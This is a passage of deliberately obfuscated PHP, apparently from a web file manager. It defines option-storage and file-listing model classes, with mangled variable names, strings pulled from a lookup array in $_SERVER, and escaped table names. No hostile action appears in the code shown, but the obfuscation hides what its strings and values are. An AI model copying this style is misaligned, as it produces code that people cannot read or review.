$‚Êå‹ÜŸ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$‚Êå‹ÜŸ) { return $›»²º× ? null : array(); } if (!$›»²º×) { $‚Êå‹ÜŸ = array_filter(array_values($‚Êå‹ÜŸ)); return array_sort_by($‚Êå‹ÜŸ, $¯³ğÊ†ô, $…ÙÔ§ß˜); } return $‚Êå‹ÜŸ[$_SERVER[¥ÙÌÜ¾ê][392] . $›»²º×]; } public function insert($ê¤Ä£››) { $‘ÈÆÙäè =& $_SERVER[¥ÙÌÜ¾ê]; $ê¤Ä£›› = array_field_key($ê¤Ä£››, $this->field); $€Ø²…ü = Model($this->modelType)->get($‘ÈÆÙäè[393], $this->optionType . $‘ÈÆÙäè[394]); $€Ø²…ü = $€Ø²…ü ? $€Ø²…ü : 0; $ê¤Ä£››[$‘ÈÆÙäè[395]] = ++$€Ø²…ü; $ê¤Ä£››[$‘ÈÆÙäè[194]] = time(); $ê¤Ä£››[$‘ÈÆÙäè[84]] = time(); Model($this->modelType)->set($‘ÈÆÙäè[393], $€Ø²…ü, $this->optionType . $‘ÈÆÙäè[394]); Model($this->modelType)->set($‘ÈÆÙäè[392] . $€Ø²…ü, $ê¤Ä£››, $this->optionType); return $€Ø²…ü; } public function update($Çè›¡Àá, $õıñïŠì) { $ŠéÚÒìÁ =& $_SERVER[¥ÙÌÜ¾ê]; $õıñïŠì = array_field_key($õıñïŠì, $this->field); $Œ±†† ­ = $this->listData($Çè›¡Àá); if (!$Œ±†† ­ || !$Çè›¡Àá) { return !1; } $õıñïŠì = array_merge($Œ±†† ­, $õıñïŠì); $õıñïŠì[$ŠéÚÒìÁ[84]] = time(); return Model($this->modelType)->set($ŠéÚÒìÁ[392] . $Çè›¡Àá, $õıñïŠì, $this->optionType); } public function remove($Û«ùğ„) { if (!$Û«ùğ„) { return !1; } return Model($this->modelType)->remove($_SERVER[¥ÙÌÜ¾ê][392] . $Û«ùğ„, $this->optionType); } public function clear() { $ºïØ‹¶¶ =& $_SERVER[¥ÙÌÜ¾ê]; Model($this->modelType)->remove($ºïØ‹¶¶[393], $this->optionType . $ºïØ‹¶¶[394]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($§ëô¥õõ, $ŸÅüÏÀÖ) { if (!$ŸÅüÏÀÖ) { return !1; } $¦„½Ê¨â = $this->listData(); $¦„½Ê¨â = array_to_keyvalue($¦„½Ê¨â, $§ëô¥õõ); return isset($¦„½Ê¨â[$ŸÅüÏÀÖ]) ? $¦„½Ê¨â[$ŸÅüÏÀÖ] : !1; } public function findByName($»û­şù) { return $this->findByKey($_SERVER[¥ÙÌÜ¾ê][28], $»û­şù); } protected function resetData($¢ãÒÆğ§) { $Ê„¤‰å‡ =& $_SERVER[¥ÙÌÜ¾ê]; $¢ãÒÆğ§ = is_array($¢ãÒÆğ§) ? $¢ãÒÆğ§ : array(); $ê‚‚šàÆ = array(); for ($øª¹Ÿœè = 0; $øª¹Ÿœè < count($¢ãÒÆğ§); $øª¹Ÿœè++) { $ê‚‚šàÆ[$Ê„¤‰å‡[392] . $¢ãÒÆğ§[$øª¹Ÿœè][$Ê„¤‰å‡[395]]] = $¢ãÒÆğ§[$øª¹Ÿœè]; } return Model($this->modelType)->set($ê‚‚šàÆ, !1, $this->optionType); } private function getAutoName($ªåÉêø) { $ã¢”€üë = array_to_keyvalue($this->listData(), $_SERVER[¥ÙÌÜ¾ê][28]); if (!$ã¢”€üë || !isset($ã¢”€üë[$ªåÉêø])) { return $ªåÉêø; } for ($ô®óøÀ = 1; $ô®óøÀ < count($ã¢”€üë); $ô®óøÀ++) { $šùƒù » = $ªåÉêø . "\50{$ô®óøÀ}\x29"; if (!isset($ã¢”€üë[$šùƒù »])) { return $šùƒù »; } } return $šùƒù »; } } goto BÊƒ²™ÍæŠ; BÊƒ²™ÍæŠ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Öú¾ š¼ = false, $Íè½Â¢â = '', $®¨›Íâò = false) { $£ïà˜´ =& $_SERVER[¥ÙÌÜ¾ê]; $±ÃÄë¹ = $this->cacheGet($Íè½Â¢â); $¶šš´¨À = $this->optionDefault($Íè½Â¢â); $¶šš´¨À = is_array($¶šš´¨À) ? $¶šš´¨À : array(); if (is_array($±ÃÄë¹)) { $±ÃÄë¹ = array_merge($¶šš´¨À, $±ÃÄë¹); return $Öú¾ š¼ ? isset($±ÃÄë¹[$Öú¾ š¼]) ? $±ÃÄë¹[$Öú¾ š¼] : null : $±ÃÄë¹; } $ø…£Ê‡ = $this->filterWhere(array($£ïà˜´[29] => $Íè½Â¢â)); $±ÃÄë¹ = $this->where($ø…£Ê‡)->select(); $±ÃÄë¹ = array_to_keyvalue($±ÃÄë¹, $£ïà˜´[93], $£ïà˜´[372]); foreach ($±ÃÄë¹ as $ıÔ„—²¾ => $ºÑŸË¨¸) { if ($®¨›Íâò || in_array($ıÔ„—²¾, $this->jsonField)) { $±ÃÄë¹[$ıÔ„—²¾] = json_decode($ºÑŸË¨¸, !0); } } $this->cacheSet($Íè½Â¢â, $±ÃÄë¹); $±ÃÄë¹ = array_merge($¶šš´¨À, $±ÃÄë¹); return $Öú¾ š¼ ? $±ÃÄë¹[$Öú¾ š¼] : $±ÃÄë¹; } public function set($ºµ¾öœŸ, $ß¥ºò®â = false, $¼¤­Í§ƒ = '') { $ÏÜ±óô =& $_SERVER[¥ÙÌÜ¾ê]; $this->cacheRemove($¼¤­Í§ƒ); $ßÈÙÃßƒ = array(); $±š³Ëè = is_array($ºµ¾öœŸ) ? $ºµ¾öœŸ : array($ºµ¾öœŸ => $ß¥ºò®â); foreach ($±š³Ëè as $ıõ¬¾öÉ => $”¢Œçäï) { if (is_array($”¢Œçäï)) { $”¢Œçäï = json_encode_force($”¢Œçäï); } $this->checkLength($”¢Œçäï, !1, $this->tableName . $ÏÜ±óô[4] . $ºµ¾öœŸ); $”¢Œçäï = self::textEncode($”¢Œçäï); $±š³Ëè = array($ÏÜ±óô[29] => $¼¤­Í§ƒ, $ÏÜ±óô[93] => $ıõ¬¾öÉ, $ÏÜ±óô[372] => $”¢Œçäï); $ßÈÙÃßƒ[] = $this->filterWhere($±š³Ëè); } if (!$ßÈÙÃßƒ) { return !0; } return $this->addAll($ßÈÙÃßƒ, array(), !0); } protected function optionDefault($ö×µ®ñ° = '') { return !1; } public function setDeep($ïåşèÓ­, $³¼¨Ôşá = false, $»Ö—ÖÆ‹ = '') { $Åèö‚µµ = explode($_SERVER[¥ÙÌÜ¾ê][95], $ïåşèÓ­); $è¯•çá = $this->get(); array_set_value($è¯•çá, $ïåşèÓ­, $³¼¨Ôşá); $this->set($Åèö‚µµ[0], $è¯•çá[$Åèö‚µµ[0]], $»Ö—ÖÆ‹); } public function remove($é©Ş½·ô, $©¥‘÷À³ = '') { $Ô†ÙóÔ =& $_SERVER[¥ÙÌÜ¾ê]; $this->cacheRemove($©¥‘÷À³); $÷é‰êÜ = $this->filterWhere(array($Ô†ÙóÔ[93] => $é©Ş½·ô, $Ô†ÙóÔ[29] => $©¥‘÷À³)); if (is_null($é©Ş½·ô)) { unset($÷é‰êÜ[$Ô†ÙóÔ[93]]); } return $this->where($÷é‰êÜ)->delete(); } public function cacheSet($ˆå§ÅÛì, $ÁÀ÷¶ù¾ = false) { return Cache::set($this->cacheKey($ˆå§ÅÛì), $ÁÀ÷¶ù¾); } public function cacheGet($ıØ‘®Â«) { return Cache::get($this->cacheKey($ıØ‘®Â«)); } public function cacheRemove($å¿·ìˆò) { return Cache::remove($this->cacheKey($å¿·ìˆò)); } protected function filterWhere($ü¶¸ñê’) { return $ü¶¸ñê’; } protected function cacheKey($½ÍÓ›×Ù) { return $½ÍÓ›×Ù; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\x75\162\143\145"; protected $tableMeta = array("\164\x61\x62\x6c\145\116\141\155\145" => "\x69\x6f\x5f\x73\x6f\165\x72\x63\x65\x5f\x6d\145\x74\141", "\155\x65\164\141\x46\x69\x65\x6c\x64" => "\x73\157\165\162\143\145\111\x44"); protected $dataAuto = array(array("\155\x6f\x64\x69\146\171\x54\x69\x6d\x65", "\x74\151\155\x65", "\151\156\163\145\x72\164", "\146\165\x6e\x63\164\151\157\156"), array("\x63\162\x65\141\164\x65\124\151\155\x65", "\164\151\x6d\x65", "\151\156\163\x65\162\164", "\x66\165\156\x63\x74\151\x6f\x6e"), array("\x76\151\145\167\x54\x69\x6d\145", "\x74\x69\155\145", "\x69\x6e\x73\145\162\x74", "\146\x75\156\x63\x74\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($˜¦®í™) { return $this->listSource(array($_SERVER[¥ÙÌÜ¾ê][396] => $˜¦®í™)); } public function typeName($×â±’…ó) { static $·‰ËÍ½ª = array(self::TYPE_SYSTEM => "\163\x79\x73\164\x65\155", self::TYPE_USER => "\x75\x73\x65\162", self::TYPE_GROUP => "\x67\x72\157\x75\160"); return $·‰ËÍ½ª[$×â±’…ó . $_SERVER[¥ÙÌÜ¾ê][33]]; } public function sourceListInfo($üİºÃ¦, $Çƒ¾ÆÉÓ = false) { $ìĞå´š =& $_SERVER[¥ÙÌÜ¾ê]; $üİºÃ¦ = $üİºÃ¦ ? $üİºÃ¦ : array(); $üİºÃ¦ = array_filter(array_unique($üİºÃ¦)); if (!$üİºÃ¦) { return array(); } $„Ä£ó¦ = $this->where(array($ìĞå´š[397] => array($ìĞå´š[7], $üİºÃ¦)))->select(); $this->_listDataApply($„Ä£ó¦, $Çƒ¾ÆÉÓ); return array_to_keyvalue($„Ä£ó¦, $ìĞå´š[397]); } public function pathInfoFilter(&$¾ª‘íÖä) { $åÀ±ôÔş =& $_SERVER[¥ÙÌÜ¾ê]; static $É‚üœåÀ = false; static $æŠ·š®­ = false; static $©¢¢Ş¦ó = false; if (!$É‚üœåÀ) { $ÜÉß÷Ûù = $åÀ±ôÔş[398]; $ÜÉß÷Ûù .= $åÀ±ôÔş[399]; $ÜÉß÷Ûù .= $åÀ±ôÔş[400]; $ÏÄò·À = $åÀ±ôÔş[401]; $Äğ‰Ø”° = explode($åÀ±ôÔş[47], $ÏÄò·À); $É‚üœåÀ = explode($åÀ±ôÔş[47], $ÜÉß÷Ûù); $æŠ·š®­ = array(); foreach ($É‚üœåÀ as $€‹ç¢¯ì) { if (in_array($€‹ç¢¯ì, $Äğ‰Ø”°)) { continue; } $æŠ·š®­[] = $€‹ç¢¯ì; } $©¢¢Ş¦ó = explode($åÀ±ôÔş[47], $åÀ±ôÔş[402]); } foreach ($©¢¢Ş¦ó as $°’»Ş’®) { if (isset($¾ª‘íÖä[$°’»Ş’®])) { $¾ª‘íÖä[$°’»Ş’®] = intval($¾ª‘íÖä[$°’»Ş’®]); } } $¾ª‘íÖä[$åÀ±ôÔş[76]] = $åÀ±ôÔş[403] . $¾ª‘íÖä[$åÀ±ôÔş[397]] . $åÀ±ôÔş[404]; $¾ª‘íÖä[$åÀ±ôÔş[29]] = $¾ª‘íÖä[$åÀ±ôÔş[405]] == 1 ? $åÀ±ôÔş[77] : $åÀ±ôÔş[193]; $¾ª‘íÖä[$åÀ±ôÔş[406]] = $this->typeName($¾ª‘íÖä[$åÀ±ôÔş[406]]); if ($¾ª‘íÖä[$åÀ±ôÔş[405]] != 1) { $¾ª‘íÖä[$åÀ±ôÔş[168]] = $¾ª‘íÖä[$åÀ±ôÔş[407]]; unset($¾ª‘íÖä[$åÀ±ôÔş[407]]); } $ûì¹ºÌÚ = $É‚üœåÀ; if (isset($¾ª‘íÖä[$åÀ±ôÔş[408]]) && $¾ª‘íÖä[$åÀ±ôÔş[408]][$åÀ±ôÔş[409]] == -1) { $ûì¹ºÌÚ = $æŠ·š®­; } $¾ª‘íÖä = array_field_key($¾ª‘íÖä, $ûì¹ºÌÚ); return $¾ª‘íÖä; } public function listUserFav() { $¤£¸ïùÂ =& $_SERVER[¥ÙÌÜ¾ê]; $»‰×½« = Model($¤£¸ïùÂ[410])->listData(); $—Ãå•§Ç = array_filter_by_field($»‰×½«, $¤£¸ïùÂ[29], $¤£¸ïùÂ[411]); $—Ãå•§Ç = array_to_keyvalue($—Ãå•§Ç, $¤£¸ïùÂ[33], $¤£¸ïùÂ[76]); if ($—Ãå•§Ç) { $ó ˆı§› = $this->listSource(array($¤£¸ïùÂ[412] => array($¤£¸ïùÂ[413], $—Ãå•§Ç))); } $ó ˆı§› = array_to_keyvalue($ó ˆı§›[$¤£¸ïùÂ[367]], $¤£¸ïùÂ[397]); foreach ($»‰×½« as &$üÁÃÌô) { $üÁÃÌô = array($¤£¸ïùÂ[414] => $üÁÃÌô[$¤£¸ïùÂ[395]], $¤£¸ïùÂ[415] => $üÁÃÌô[$¤£¸ïùÂ[28]], $¤£¸ïùÂ[416] => $üÁÃÌô[$¤£¸ïùÂ[76]], $¤£¸ïùÂ[417] => $üÁÃÌô[$¤£¸ïùÂ[29]], $¤£¸ïùÂ[418] => $üÁÃÌô[$¤£¸ïùÂ[194]], $¤£¸ïùÂ[419] => $üÁÃÌô[$¤£¸ïùÂ[84]]); if ($üÁÃÌô[$¤£¸ïùÂ[29]] == $¤£¸ïùÂ[411] && $ó ˆı§›[$üÁÃÌô[$¤£¸ïùÂ[76]]]) { $üÁÃÌô[$¤£¸ïùÂ[85]] = $ó ˆı§›[$üÁÃÌô[$¤£¸ïùÂ[76]]]; } } unset($üÁÃÌô); return $»‰×½«; } public function listUserTag($€İïÜíû) { $‰µÛ¢â =& $_SERVER[¥ÙÌÜ¾ê]; if ($€İïÜíû && !is_array($€İïÜíû)) { $€İïÜíû = array($€İïÜíû); } $¶¨¥öñÛ = Model($‰µÛ¢â[420])->listData(); $ü©…½¤¦ = array(); foreach ($¶¨¥öñÛ as $ıø¹Š‰¿) { $‚³Ã‚ßŞ = $ıø¹Š‰¿[$‰µÛ¢â[76]]; if (!$‚³Ã‚ßŞ) { continue; } if (!isset($ü©…½¤¦[$‚³Ã‚ßŞ])) { $ü©…½¤¦[$‚³Ã‚ßŞ] = array(); } $ü©…½¤¦[$‚³Ã‚ßŞ][] = $ıø¹Š‰¿[$‰µÛ¢â[421]]; } $ûÔ¡ˆ§î = array(); foreach ($ü©…½¤¦ as $çÓ½Ò => $Ôò’³³¼) { $ÊïËäğÃ = !0; if (!$€İïÜíû) { $ûÔ¡ˆ§î[] = $çÓ½Ò; continue; } foreach ($€İïÜíû as $úşÜ‰ïŒ) { if (!in_array($úşÜ‰ïŒ, $Ôò’³³¼)) { $ÊïËäğÃ = !1; break; } } if ($ÊïËäğÃ) { $ûÔ¡ˆ§î[] = $çÓ½Ò; } } if (!$ûÔ¡ˆ§î) { return array(); } $â÷…ğ’¯ = $this->listSource(array($‰µÛ¢â[412] => array($‰µÛ¢â[413], $ûÔ¡ˆ§î))); if (!$â÷…ğ’¯ || count($ûÔ¡ˆ§î) == $â÷…ğ’¯[$‰µÛ¢â[364]][$‰µÛ¢â[365]]) { return $â÷…ğ’¯; } $—Ğ”÷—¦ = array(); $æıÁµ = array_to_keyvalue($â÷…ğ’¯[$‰µÛ¢â[75]], $‰µÛ¢â[33], $‰µÛ¢â[397]); $‰³×æ’¯ = array_to_keyvalue($â÷…ğ’¯[$‰µÛ¢â[74]], $‰µÛ¢â[33], $‰µÛ¢â[397]); $µàÓêò = array_merge($‰³×æ’¯, $æıÁµ); foreach ($ûÔ¡ˆ§î as $‚³Ã‚ßŞ) { if (!in_array($‚³Ã‚ßŞ, $µàÓêò)) { $—Ğ”÷—¦[] = $‚³Ã‚ßŞ; } } if ($—Ğ”÷—¦) { Model($‰µÛ¢â[422])->removeBySource($—Ğ”÷—¦); } return $â÷…ğ’¯; } public function listUserRecycle() { $¹ŸˆÉÖŒ =& $_SERVER[¥ÙÌÜ¾ê]; $’Âù‰Á = Model($¹ŸˆÉÖŒ[423])->listData(); if (!$’Âù‰Á) { return array(); } $–å˜á = array($¹ŸˆÉÖŒ[412] => array($¹ŸˆÉÖŒ[413], $’Âù‰Á), $¹ŸˆÉÖŒ[424] => 1); return $this->listSource($–å˜á); } public function listSource($Ş›¨°»Â, $É·¶²Ş = 3000) { $’ò‰Ğ€ =& $_SERVER[¥ÙÌÜ¾ê]; if (!isset($Ş›¨°»Â[$’ò‰Ğ€[425]])) { $Ş›¨°»Â[$’ò‰Ğ€[425]] = 0; } $”éÙİÖÚ = $’ò‰Ğ€[426]; $ó©¾¶Œ = $this->field($”éÙİÖÚ)->_makeOrder()->where($Ş›¨°»Â)->selectPage($É·¶²Ş); $this->_listPageCheck($ó©¾¶Œ, $”éÙİÖÚ, $Ş›¨°»Â); $this->_listDataApply($ó©¾¶Œ[$’ò‰Ğ€[367]]); $this->_listMake($ó©¾¶Œ); return $ó©¾¶Œ; } private function _listPageCheck(&$…œ›°Ùø, $ÕÕÁ¡Š¸, $¤…Úú¢ç) { $Ë×‰ºÖ =& $_SERVER[¥ÙÌÜ¾ê]; if (!is_array($…œ›°Ùø[$Ë×‰ºÖ[364]])) { return; } $ôéô¦®Ù = $…œ›°Ùø[$Ë×‰ºÖ[364]]; if ($ôéô¦®Ù[$Ë×‰ºÖ[366]] <= 1) { return; } if ($ôéô¦®Ù[$Ë×‰ºÖ[365]] >= 100000) { return; } if (Model($Ë×‰ºÖ[427])->get($Ë×‰ºÖ[428]) != $Ë×‰ºÖ[429]) { return; } $ÕÕÁ¡Š¸ = str_replace(array($Ë×‰ºÖ[50], $Ë×‰ºÖ[340], $Ë×‰ºÖ[229]), $Ë×‰ºÖ[33], $ÕÕÁ¡Š¸); $ÕÕÁ¡Š¸ = $Ë×‰ºÖ[430] . str_replace($Ë×‰ºÖ[47], $Ë×‰ºÖ[431], $ÕÕÁ¡Š¸) . $Ë×‰ºÖ[432]; $ŒÀË¦ëÙ = $Ë×‰ºÖ[433]; $ŒÀË¦ëÙ = $ŒÀË¦ëÙ . $Ë×‰ºÖ[434]; $çç¼ÜÔî = $ôéô¦®Ù[$Ë×‰ºÖ[361]] * ($ôéô¦®Ù[$Ë×‰ºÖ[351]] - 1) . $Ë×‰ºÖ[47] . $ôéô¦®Ù[$Ë×‰ºÖ[361]]; $ÀùœôÀ¢ = $this->_makeOrder(!0); $À½ÀÆÑ¼ = $Ë×‰ºÖ[430] . str_replace($Ë×‰ºÖ[47], $Ë×‰ºÖ[431], $ÀùœôÀ¢[0]); if (strpos($À½ÀÆÑ¼, $Ë×‰ºÖ[435])) { $À½ÀÆÑ¼ = str_replace($Ë×‰ºÖ[435], $Ë×‰ºÖ[436], $À½ÀÆÑ¼); } else { $À½ÀÆÑ¼ .= $Ë×‰ºÖ[437] . $ÀùœôÀ¢[1]; } $ŒöÇ¦¾ç = array(); foreach ($¤…Úú¢ç as $ŸìğèµŸ => $¬ıÏ¦×ª) { $ŒöÇ¦¾ç[$Ë×‰ºÖ[430] . $ŸìğèµŸ] = $¬ıÏ¦×ª; } $this->alias($Ë×‰ºÖ[438])->field($ÕÕÁ¡Š¸)->limit($çç¼ÜÔî)->order($À½ÀÆÑ¼); $è¢èûıĞ = $this->join($ŒÀË¦ëÙ)->where($ŒöÇ¦¾ç)->select(); if ($è¢èûıĞ) { $…œ›°Ùø[$Ë×‰ºÖ[367]] = $è¢èûıĞ; } } protected function _makeOrder($Äş­–Š– = false) { $Áƒ’†ıú =& $_SERVER[¥ÙÌÜ¾ê]; $ù¼Şşä€ = Model($Áƒ’†ıú[439])->get($Áƒ’†ıú[440]); $›Ã²Å¨ = Model($Áƒ’†ıú[439])->get($Áƒ’†ıú[441]); $Ÿ“éÓÕŠ = array($Áƒ’†ıú[442] => $Áƒ’†ıú[443], $Áƒ’†ıú[444] => $Áƒ’†ıú[445]); $¦ş×–ï¿ = array($Áƒ’†ıú[28] => $Áƒ’†ıú[28], $Áƒ’†ıú[78] => $Áƒ’†ıú[78], $Áƒ’†ıú[168] => $Áƒ’†ıú[407], $Áƒ’†ıú[446] => $Áƒ’†ıú[446], $Áƒ’†ıú[447] => $Áƒ’†ıú[448], $Áƒ’†ıú[194] => $Áƒ’†ıú[194], $Áƒ’†ıú[84] => $Áƒ’†ıú[84]); $£îıÑ¢ó = Input::get($Áƒ’†ıú[449], $Áƒ’†ıú[7], $ù¼Şşä€, array_keys($¦ş×–ï¿)); $˜¢«ø¥Ù = Input::get($Áƒ’†ıú[450], $Áƒ’†ıú[7], $›Ã²Å¨, array_keys($Ÿ“éÓÕŠ)); if (!in_array($£îıÑ¢ó, array_keys($¦ş×–ï¿))) { $£îıÑ¢ó = $Áƒ’†ıú[28]; } if (!in_array($˜¢«ø¥Ù, array_keys($Ÿ“éÓÕŠ))) { $£îıÑ¢ó = $Áƒ’†ıú[442]; } if ($£îıÑ¢ó == $Áƒ’†ıú[28]) { } $ÖÌÎß‚À = $Áƒ’†ıú[451] . $¦ş×–ï¿[$£îıÑ¢ó] . $Áƒ’†ıú[50] . $Ÿ“éÓÕŠ[$˜¢«ø¥Ù]; $ÖÌÎß‚À = rtrim(trim($ÖÌÎß‚À), $Áƒ’†ıú[47]); if ($Äş­–Š–) { return array($ÖÌÎß‚À, $Ÿ“éÓÕŠ[$˜¢«ø¥Ù]); } return $this->order($ÖÌÎß‚À); } protected function _listDataApplyItem($ñúÚ©•³, $ßÌËı§Ë = false) { $“’èì÷› = array($ñúÚ©•³); $this->_listDataApply($“’èì÷›, $ßÌËı§Ë); return $“’èì÷›[0]; } protected function _listDataApply(&$üİ•Ó¹Š, $à¬‚ÑŸÕ = false) { $´çœ¯×¾ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$üİ•Ó¹Š) { $üİ•Ó¹Š = array(); return; } $ÁñúÛ¯» = array_to_keyvalue($üİ•Ó¹Š, $´çœ¯×¾[33], $´çœ¯×¾[397]); $ÁñúÛ¯» = array_unique($ÁñúÛ¯»); $this->_listSourceCache($üİ•Ó¹Š); if (!$à¬‚ÑŸÕ) { $this->_listAppendMeta($üİ•Ó¹Š, $ÁñúÛ¯»); $this->_listAppendFileMeta($üİ•Ó¹Š, $ÁñúÛ¯»); $this->_listAppendChildren($üİ•Ó¹Š, $ÁñúÛ¯»); } $this->_listAppendPath($üİ•Ó¹Š); $this->_listAppendAuth($üİ•Ó¹Š); $this->_listAppendSourceInfo($üİ•Ó¹Š, $ÁñúÛ¯»); $this->_listAppendUser($üİ•Ó¹Š); $this->_listFilterInfo($üİ•Ó¹Š, $à¬‚ÑŸÕ); $this->_listAppendAuthSecret($üİ•Ó¹Š); } protected function _listSourceCache($Ş–Ú‰ª¬) { $©º–³¾ê =& $_SERVER[¥ÙÌÜ¾ê]; foreach ($Ş–Ú‰ª¬ as $ ‘ê“¯) { self::$cacheSourceInfo[$©º–³¾ê[452] . $ ‘ê“¯[$©º–³¾ê[397]]] = $ ‘ê“¯; } } protected function _listFilterInfo(&$öóÅùò, $ê¯‘î± = false) { $ßñËˆü =& $_SERVER[¥ÙÌÜ¾ê]; foreach ($öóÅùò as &$ƒù¤ÃÃš) { $ƒù¤ÃÃš = $this->pathInfoFilter($ƒù¤ÃÃš); self::$cachePathInfo[$ßñËˆü[453] . intval($ê¯‘î±) . $ßñËˆü[454] . $ƒù¤ÃÃš[$ßñËˆü[397]]] = $ƒù¤ÃÃš; } unset($ƒù¤ÃÃš); } protected function _listMake(&$ˆŸÓ–úº) { $¢—şúÏ¸ =& $_SERVER[¥ÙÌÜ¾ê]; $ˆŸÓ–úº[$¢—şúÏ¸[75]] = array(); $ˆŸÓ–úº[$¢—şúÏ¸[74]] = array(); foreach ($ˆŸÓ–úº[$¢—şúÏ¸[367]] as $øÌ³º¿) { $êÀ—æºª = $øÌ³º¿[$¢—şúÏ¸[405]] == 1 ? $¢—şúÏ¸[75] : $¢—şúÏ¸[74]; $ˆŸÓ–úº[$êÀ—æºª][] = $øÌ³º¿; } unset($ˆŸÓ–úº[$¢—şúÏ¸[367]]); } protected function _listAppendMeta(&$šŸÅª£’, $ƒÖ¢öƒ©) { $Ë‚Êùùä =& $_SERVER[¥ÙÌÜ¾ê]; $ıåÃî™¨ = array($Ë‚Êùùä[412] => array($Ë‚Êùùä[413], $ƒÖ¢öƒ©)); $Æœñ°Õ† = Model($Ë‚Êùùä[455])->field($Ë‚Êùùä[456])->where($ıåÃî™¨)->select(); if (!$Æœñ°Õ†) { return; } $ˆ³àæ§Ø = array($Ë‚Êùùä[457], $Ë‚Êùùä[458], $Ë‚Êùùä[436]); $§øÌÁ“ = array(); foreach ($Æœñ°Õ† as $§Ä×Ø²ö) { if (!isset($§øÌÁ“[$§Ä×Ø²ö[$Ë‚Êùùä[397]]])) { $§øÌÁ“[$§Ä×Ø²ö[$Ë‚Êùùä[397]]] = array(); } if (in_array($§Ä×Ø²ö[$Ë‚Êùùä[93]], $ˆ³àæ§Ø)) { continue; } $§øÌÁ“[$§Ä×Ø²ö[$Ë‚Êùùä[397]]][$§Ä×Ø²ö[$Ë‚Êùùä[93]]] = $§Ä×Ø²ö[$Ë‚Êùùä[372]]; } foreach ($šŸÅª£’ as &$ŠûÇ›„Ê) { $ŠûÇ›„Ê[$Ë‚Êùùä[459]] = !1; if (isset($§øÌÁ“[$ŠûÇ›„Ê[$Ë‚Êùùä[397]]])) { $ŠûÇ›„Ê[$Ë‚Êùùä[459]] = $§øÌÁ“[$ŠûÇ›„Ê[$Ë‚Êùùä[397]]]; } if ($this->fileIsLock($ŠûÇ›„Ê) && $ŠûÇ›„Ê[$Ë‚Êùùä[408]]) { $ÒÉÁÌµˆ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ŠûÇ›„Ê[$Ë‚Êùùä[408]][$Ë‚Êùùä[409]] = AuthModel::authDisable($ŠûÇ›„Ê[$Ë‚Êùùä[408]][$Ë‚Êùùä[409]], $ÒÉÁÌµˆ); $ŠûÇ›„Ê[$Ë‚Êùùä[408]][$Ë‚Êùùä[460]][$Ë‚Êùùä[408]] = $ŠûÇ›„Ê[$Ë‚Êùùä[408]][$Ë‚Êùùä[409]]; } } unset($ŠûÇ›„Ê); } protected function _listAppendFileMeta(&$Ê¹´±Î¹, $ºşÙ®ºæ) { $À°İõÅÑ =& $_SERVER[¥ÙÌÜ¾ê]; $ô½Ø’ğı = array_to_keyvalue($Ê¹´±Î¹, $À°İõÅÑ[33], $À°İõÅÑ[461]); $ô½Ø’ğı = array_filter(array_unique($ô½Ø’ğı)); if (!$ô½Ø’ğı) { return; } $¢áƒÌÃ– = array($À°İõÅÑ[462] => array($À°İõÅÑ[413], $ô½Ø’ğı)); $äÑ£Õ© = $À°İõÅÑ[463]; $­òşÕú¬ = Model($À°İõÅÑ[464])->field($äÑ£Õ©)->where($¢áƒÌÃ–)->select(); $­òşÕú¬ = array_to_keyvalue($­òşÕú¬, $À°İõÅÑ[461]); $°‡ñ†¬¡ = Model($À°İõÅÑ[465])->field($À°İõÅÑ[466])->where($¢áƒÌÃ–)->select(); $°‡ñ†¬¡ = $°‡ñ†¬¡ ? $°‡ñ†¬¡ : array(); $æ…¹«½• = array(); foreach ($°‡ñ†¬¡ as $ŸÆÖ¾Åœ) { if (!isset($æ…¹«½•[$ŸÆÖ¾Åœ[$À°İõÅÑ[461]]])) { $æ…¹«½•[$ŸÆÖ¾Åœ[$À°İõÅÑ[461]]] = array(); } $æ…¹«½•[$ŸÆÖ¾Åœ[$À°İõÅÑ[461]]][$ŸÆÖ¾Åœ[$À°İõÅÑ[93]]] = $ŸÆÖ¾Åœ[$À°İõÅÑ[372]]; } foreach ($Ê¹´±Î¹ as &$åÁúØ¤¤) { $«ÊÏ‹ = $åÁúØ¤¤[$À°İõÅÑ[461]]; if (!$«ÊÏ‹ || !is_array($­òşÕú¬[$«ÊÏ‹])) { continue; } $„‡òáŠó = $­òşÕú¬[$«ÊÏ‹]; $„‡òáŠó[$À°İõÅÑ[78]] = $åÁúØ¤¤[$À°İõÅÑ[78]]; $„‡òáŠó[$À°İõÅÑ[28]] = $åÁúØ¤¤[$À°İõÅÑ[28]]; if (!isset(self::$cacheFileInfo[$À°İõÅÑ[467] . $«ÊÏ‹])) { self::$cacheFileInfo[$À°İõÅÑ[467] . $«ÊÏ‹] = array_merge(array(), $„‡òáŠó); } unset($­òşÕú¬[$«ÊÏ‹][$À°İõÅÑ[76]]); $§úøóÁÈ = is_array($æ…¹«½•[$«ÊÏ‹]) ? $æ…¹«½•[$«ÊÏ‹] : array(); $åÁúØ¤¤[$À°İõÅÑ[164]] = array_merge($§úøóÁÈ, $­òşÕú¬[$«ÊÏ‹]); if (isset($åÁúØ¤¤[$À°İõÅÑ[164]][$À°İõÅÑ[163]])) { $åÁúØ¤¤[$À°İõÅÑ[163]] = json_decode($åÁúØ¤¤[$À°İõÅÑ[164]][$À°İõÅÑ[163]], !0); unset($åÁúØ¤¤[$À°İõÅÑ[164]][$À°İõÅÑ[163]]); } } unset($åÁúØ¤¤); } protected function _listAppendSourceInfo(&$¤â§¤ê¢, $¾×Å¬¥) { $ĞÏ¶êíÑ =& $_SERVER[¥ÙÌÜ¾ê]; if (!defined($ĞÏ¶êíÑ[468])) { return; } $ÏŠúÙ‘¹ = Model($ĞÏ¶êíÑ[469])->listData(); $ó•Š£¾¯ = Model($ĞÏ¶êíÑ[420])->listData(); $¦‘½ßƒÈ = Model($ĞÏ¶êíÑ[410])->listData(); $õì¶·Ñ = Model($ĞÏ¶êíÑ[470])->listSimple(); $øŸ½¡§ó = array_to_keyvalue($ÏŠúÙ‘¹, $ĞÏ¶êíÑ[395]); 